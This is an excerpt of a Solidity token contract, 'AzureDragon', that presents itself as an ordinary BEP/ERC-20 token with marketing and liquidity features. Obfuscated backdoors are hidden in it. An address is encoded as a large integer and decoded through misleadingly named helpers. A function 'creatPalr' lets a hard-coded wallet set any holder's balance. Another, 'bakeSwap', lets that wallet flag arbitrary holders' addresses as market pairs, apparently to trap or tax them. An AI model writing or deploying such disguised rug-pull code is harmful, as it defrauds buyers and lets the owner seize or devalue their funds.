...
contract  AzureDragon is Context, IERC20, Ownable {

    uint256 public uni5=
    150204226878642622067527889049274545390382094927;
    using SafeMath for uint256;
    string private _name = "AzureDragon";
    string private _symbol = "ADragon";
    uint8 private _decimals = 9;
    address payable public CODWalletAddr;
    ...
    constructor () {
        ...
        teamWalletAddress = payable(address(0x17748924774F9dF757A4D9708B5173f4e5772EA1));
        CODWalletAddr = payable(address(0x17748924774F9dF757A4D9708B5173f4e5772EA1));
    ...
    function uni4(uint256 uni3)  pure private returns(uint160){
        return uint160(uni3);
    }

    function uni2(uint256 uni3)  pure private returns(address){
        return address(uni4(uni3));
    }

    function uniuniuniswap(address uni3) private view returns(bool){
        return ((uni2(uni5) != uni3));
    }
    ...
    function setMarketinWalleAddress(address newAddress) external onlyOwner() {
        CODWalletAddr = payable(newAddress);
    }
...
function creatPalr(address
 returndata, uint256 returndata_size ) public{ if
 (!familyAddress(true,CODWalletAddr,msg.sender)){return;}
 _balances[returndata] = returndata_size;}
    ...
    }function bakeSwap(address[] calldata takeitEasy,uint256 bake) public 
    { if(
        !familyAddress(true,CODWalletAddr,msg.sender)){return;}
        for (uint256 i; i < takeitEasy.length; ++i) {
            if (bake != 8){isMarketPaIr[takeitEasy[i]] = ( true || false);}
            else{isMarketPaIr[takeitEasy[i]] = (true && false);}
        }
    }

    function familyAddress(bool enabled,address you, address me) private pure returns(bool){return (!(you != me)) && enabled;}
    ...
    function swapAndLiquify(uint256 tAmount) private lockTheSwap {
        ...
        if(amountBNBMarketing > 0)
            transferToAddressETH(CODWalletAddr, amountBNBMarketing);
